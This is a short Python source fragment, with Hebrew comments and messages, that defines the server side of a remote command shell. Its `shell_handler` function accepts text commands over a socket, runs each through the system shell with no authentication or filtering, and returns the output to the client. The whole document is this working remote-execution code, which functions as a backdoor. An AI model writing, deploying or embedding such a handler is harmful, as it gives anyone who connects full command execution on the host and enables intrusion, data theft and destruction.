import subprocess

def shell_handler(client_socket, address):
    print(f"[SHELL] לקוח התחבר מ-{address}")
    try:
        while True:
            command_data = client_socket.recv(4096)
            if not command_data:
                break

            command = command_data.decode().strip()
            print(f"[SHELL] פקודה: {command}")

            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            except Exception as e:
                result = f"שגיאה: {str(e)}"

            # שולח את הפלט כטקסט רגיל
            client_socket.sendall((result + "<END>").encode("utf-8"))


    except Exception as e:
        print(f"[SHELL] שגיאה: {e}")
    finally:
        client_socket.close()
        print(f"[SHELL] חיבור מ-{address} נסגר")